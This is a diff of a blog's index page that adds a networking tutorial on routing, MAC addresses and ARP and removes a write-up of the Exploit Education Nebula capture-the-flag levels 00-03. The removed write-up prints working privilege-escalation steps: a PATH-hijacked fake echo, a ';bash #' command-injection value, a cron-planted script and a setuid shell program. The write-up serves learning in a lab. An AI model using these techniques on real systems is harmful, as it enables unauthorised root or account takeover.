@@ -28,7 +28,99 @@
         </div>
     </header>
     <div id="wrapper">
-        <div id="content">            <h4 class="date">Sep 17, 2020</h4>
+        <div id="content">            <h4 class="date">Sep 19, 2020</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://blog.smigiel.dev/networking-pt-2.html" rel="bookmark" title="Permanent Link to &quot;Networking Pt 2&quot;">Networking Pt 2</a>
+                </h2>
+
+                
+                
+
+                <h1>Routing</h1>
+<p>A router is a networking device that forwards data packets between computer networks. A router os connected to two or more data lines from different IP networks. When a data packet comes in one of the lines, the router reads the network address information in the packet header to determine the destination. Then, based on routing table, it directs the packet to the next network.
+Routing table contains information about the topology of the network immediately around it.
+The table can also contain an entry with the <strong>default address</strong> <code>0.0.0.0</code>. This entry is used when the router receives a packet whose destination is an <em>unknown network</em>.</p>
+<h2>Routing table example (router)</h2>
+<div class="highlight"><pre><span></span><span class="err">Kernel IP routing table</span>
+<span class="err">Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span>
+<span class="err">87.169.144.1    0.0.0.0         255.255.255.255 UH        0 0          0 eth0</span>
+<span class="err">192.168.1.0     0.0.0.0         255.255.255.0   U         0 0          0 br0</span>
+<span class="err">87.169.144.0    0.0.0.0         255.255.252.0   U         0 0          0 eth0</span>
+<span class="err">127.0.0.0       0.0.0.0         255.0.0.0       U         0 0          0 lo</span>
+<span class="err">0.0.0.0         87.169.144.1    0.0.0.0         UG        0 0          0 eth0</span>
+</pre></div>
+
+
+<p>The kernel reads routing table from the top down. The first column is the destination. The second column tells how to reach that destination.
+The default gateway is always shown with the destination <code>0.0.0.0</code>. The IP address in the gateway column is that of the outbound gateway router. The netmask for the default gateway means that any packet not addressed to the local network or another outbound router by additional entries in the routing table are to be sent to the default gateway regardless of the network class.</p>
+<h1>Networking Layer 2</h1>
+<p>Every host on a network has both an IP and a MAC address. When server A wants to send a packet to server B:</p>
+<ol>
+<li>server A creates a packet:<ul>
+<li>the destination IP address of server B in the IP header of the datagram.</li>
+<li>the destination MAC address of the router in the link layer header of the frame.</li>
+<li>the source IP address of the server A.</li>
+<li>the source MAC address of the server A.</li>
+</ul>
+</li>
+<li>router takes a packet and forwards it to server B (the destination MAC address is the MAC address of the <strong>next hop</strong>):<ul>
+<li>the destination MAC address is rewritten to server B</li>
+<li>the source MAC address is of router.</li>
+<li><strong>Only MAC address is changed. IP address stays the same (both source and destination)</strong>. This is global information and remains the same along the packet trip.</li>
+</ul>
+</li>
+</ol>
+<h2>MAC address</h2>
+<p>MAC address is a unique identifier assigned to a network interface controller (NIC). It is assigned by device manufacturer: typically includes a manufacturer's organizationally unique identifier. MAC address is 48 bit (6 bytes) long and is expressed in hexadecimal form: <code>AA:BB:CC:DD:EE:FF</code>.</p>
+<p>The IEEE has built in special address to allow more than one NIC to be addressed at one time. It's called broadcast address: <code>FF:FF:FF:FF:FF:FF</code>. Frame with this address is delivered to all devices in the local network.</p>
+<h2>Network segmentation</h2>
+<p>Switches do not segment networks. Only routers do so. Usually, every interface of a router is connected to different network. This is the reason, why routers <strong>do not forward broadcast packets</strong>, like switches.</p>
+<h2>Packet forwarding</h2>
+<p>To forward a packet:</p>
+<ul>
+<li>the switch reads the destination MAC address of the frame.</li>
+<li>it performs a look-up in the CAM table.</li>
+<li>it forwads the packet to the corresponding interface.</li>
+<li>if there is no entry with the MAC address, the switch will forward the frame to all its interfaces.</li>
+</ul>
+<h2>Address Resolution Protocol (ARP)</h2>
+<p>The ARP is a communication protocol used for discovering the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address.</p>
+<h3>Example of workflow</h3>
+<p>Two computers are connected to the same local network. Computer A wants to send packet to Computer B. Through DNS, it determines Computer B <strong>IP address</strong> <code>192.168.0.2</code>.
+To send message, Computer A also requires MAC address.</p>
+<ol>
+<li>
+<p>Computer A retrieves cached information from ARP table for <code>192.168.0.2</code></p>
+<ul>
+<li>if the cache didn't produce a result for IP address, Computer A sends broadcast ARP request message <code>FF:FF:FF:FF:FF:FF</code>, requesting an answer for <code>192.168.0.2</code>.</li>
+</ul>
+</li>
+<li>
+<p>Based on retrieved information, Computer A sends packet with MAC adress and IP address.</p>
+</li>
+</ol>
+<p>ARP table has time-to-live (TTL) for every entry. When it expires, or on power off, host discards entries.</p>
+<h1>Additional resources</h1>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Router_(computing)">Router</a></li>
+<li><a href="https://en.wikipedia.org/wiki/IP_routing">IP routing</a></li>
+<li><a href="https://tldp.org/LDP/nag2/x-087-2-iface.netstat.html">netstat command</a></li>
+<li><a href="https://opensource.com/business/16/8/introduction-linux-network-routing">Introduction to Linux network routing</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Mac_address">MAC address</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol">ARP</a></li>
+</ul>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://blog.smigiel.dev/networking-pt-2.html">posted at 00:00</a>
+                    &nbsp;&middot;
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags">learning</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/pts.html" class="tags">pts</a>
+                    &nbsp;<a href="https://blog.smigiel.dev/tag/network.html" class="tags">network</a>
+                </div>
+            </article>            <h4 class="date">Sep 17, 2020</h4>
 
             <article class="post">
                 <h2 class="title">
@@ -470,143 +562,6 @@ You have successfully executed getflag on a target account
 
                 <div class="info">
                     <a href="https://blog.smigiel.dev/exploit-education-nebula-part-2.html">posted at 00:00</a>
-                    &nbsp;&middot;
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags">learning</a>
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/ctf.html" class="tags">ctf</a>
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/exploit.html" class="tags">exploit</a>
-                    &nbsp;<a href="https://blog.smigiel.dev/tag/nebula.html" class="tags">nebula</a>
-                </div>
-            </article>            <h4 class="date">Sep 05, 2020</h4>
-
-            <article class="post">
-                <h2 class="title">
-                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html" rel="bookmark" title="Permanent Link to &quot;Exploit Education - Nebula Part 1&quot;">Exploit Education - Nebula Part 1</a>
-                </h2>
-
-                
-                
-
-                <h1><a href="https://exploit.education/nebula/">Nebula</a></h1>
-<h2>Basics</h2>
-<p>Nebula VM has 20 levels. Each level can be accessed with <code>levelXX</code> username and the same password.</p>
-<h2><a href="https://exploit.education/nebula/level-00/">Level 00</a></h2>
-<h4>Solution</h4>
-<div class="highlight"><pre><span></span>find / -type f -user flag00 -perm -0400 <span class="m">2</span>&gt;/dev/null
-</pre></div>
-
-
-<p>Search for all files, in all directories, belonging to <code>flag00</code> user, with <a href="https://en.wikipedia.org/wiki/Setuid">setuid</a>. Redirect all "permission error" (stderr) messages to <code>/dev/null</code> discarding those messages.</p>
-<h4>Result</h4>
-<div class="highlight"><pre><span></span>level00@nebula:~$ getflag
-getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
-level00@nebula:~$ find / -type f -user flag00 -perm -0400 <span class="m">2</span>&gt;/dev/null
-/bin/.../flag00
-/home/flag00/.bash_logout
-/home/flag00/.bashrc
-/home/flag00/.profile
-level00@nebula:~$ /bin/.../flag00
-Congrats, now run getflag to get your flag!
-flag00@nebula:~$
-flag00@nebula:~$ getflag
-You have successfully executed getflag on a target account
-</pre></div>
-
-
-<h2><a href="https://exploit.education/nebula/level-01/">Level01</a></h2>
-<h4>Solution</h4>
-<p>Program allows to execute arbitrary program due to <code>system</code> call for <code>echo</code>.
-Let's create fake echo with to run <code>bash</code> session with <code>flag01</code> UID.</p>
-<h4>Result</h4>
-<div class="highlight"><pre><span></span>level01@nebula:~$ getflag
-getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
-level01@nebula:~$ cat &gt; /tmp/echo <span class="s">&lt;&lt; EOF</span>
-<span class="s">&gt; #!/usr/bin/env bash</span>
-<span class="s">&gt; bash</span>
-<span class="s">&gt; EOF</span>
-level01@nebula:~$ chmod +x /tmp/echo
-level01@nebula:~$ <span class="nb">cd</span> ~flag01/
-level01@nebula:/home/flag01$ ./flag01
-and now what?
-level01@nebula:/home/flag01$ <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span> ./flag01
-flag01@nebula:/home/flag01$ getflag
-You have successfully executed getflag on a target account
-</pre></div>
-
-
-<h2><a href="https://exploit.education/nebula/level-02/">Level02</a></h2>
-<h4>Solution</h4>
-<p>Program is reading <code>USER</code> variable, which can be provided by attacker.</p>
-<h4>Result</h4>
-<div class="highlight"><pre><span></span>level02@nebula:~$ getflag
-getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
-level02@nebula:~$ <span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;;bash #&quot;</span> /home/flag02/flag02
-about to call system<span class="o">(</span><span class="s2">&quot;/bin/echo ;bash # is cool&quot;</span><span class="o">)</span>
-
-flag02@nebula:~$ getflag
-You have successfully executed getflag on a target account
-</pre></div>
-
-
-<h2><a href="https://exploit.education/nebula/level-03/">Level03</a></h2>
-<h4>Solution</h4>
-<p>Cron is running script which is picking up content of <code>writable.d</code> directory. It is executing whatever is there. It means, that anything what is running via cron, will have the same permissions.</p>
-<h4>Result</h4>
-<div class="highlight"><pre><span></span>level03@nebula:~$ getflag
-getflag is executing on a non-flag account, this doesn<span class="err">&#39;</span>t count
-level03@nebula:~$ <span class="nb">cd</span> ~flag03
-level03@nebula:/home/flag03$ cat &gt; writable.d/flag <span class="s">&lt;&lt; EOF</span>
-<span class="s">&gt; #!/usr/bin/env bash</span>
-<span class="s">&gt; getflag &gt; /tmp/flag.result</span>
-<span class="s">&gt; EOF</span>
-level03@nebula:/home/flag03$ cat /tmp/flag.result
-You have successfully executed getflag on a target account
-</pre></div>
-
-
-<h4>Solution2</h4>
-<p>Prepare simple C program to gain bash access</p>
-<h4>Result2</h4>
-<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
-<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
-  <span class="kt">gid_t</span> <span class="n">gid</span><span class="p">;</span>
-  <span class="kt">uid_t</span> <span class="n">uid</span><span class="p">;</span>
-  <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-  <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
-
-  <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-  <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
-  <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
-<span class="p">}</span>
-</pre></div>
-
-
-<div class="highlight"><pre><span></span>level03@nebula:/tmp$ cat &gt; /home/flag03/writable.d/exploit.sh <span class="s">&lt;&lt; EOF</span>
-<span class="s">&gt; #!/usr/bin/env bash</span>
-<span class="s">&gt; cp /tmp/exploit /home/flag03/exploitable</span>
-<span class="s">&gt; chmod u+s /home/flag03/exploitable</span>
-<span class="s">&gt; EOF</span>
-</pre></div>
-
-
-<h4>Mistakes</h4>
-<h5>First</h5>
-<p>I tried to create copy of <code>exploit</code> program in <code>/tmp</code> directory. However, when I tried to run it, it didn't give me <code>flag03</code> user. After looking into <code>/etc/fstab</code> it became obvious:</p>
-<div class="highlight"><pre><span></span><span class="err">flag03@nebula:/home/flag03$ cat /etc/fstab</span>
-<span class="err">overlayfs / overlayfs rw 0 0</span>
-<span class="err">tmpfs /tmp tmpfs nosuid,nodev 0 0</span>
-</pre></div>
-
-
-<p><code>tmpfs</code> has <code>nosuid</code> option. It means, that the nosuid mount option specifies that the filesystem cannot contain set userid files.</p>
-<h5>Second</h5>
-<p>When I found that <code>nosetuid</code> is preventing from running program from within <code>/tmp</code>, I decided to copy <code>exploit</code> to <code>/home/level03</code>. It failed, because default user running <code>writable.sh</code> wasn't <code>root</code> but <code>flag03</code>. Solution was to copy payload to <code>/home/flag03</code> directory.</p>
-                <div class="clear"></div>
-
-                <div class="info">
-                    <a href="https://blog.smigiel.dev/exploit-education-nebula-part-1.html">posted at 00:00</a>
                     &nbsp;&middot;
                     &nbsp;<a href="https://blog.smigiel.dev/tag/learning.html" class="tags">learning</a>
                     &nbsp;<a href="https://blog.smigiel.dev/tag/ctf.html" class="tags">ctf</a>
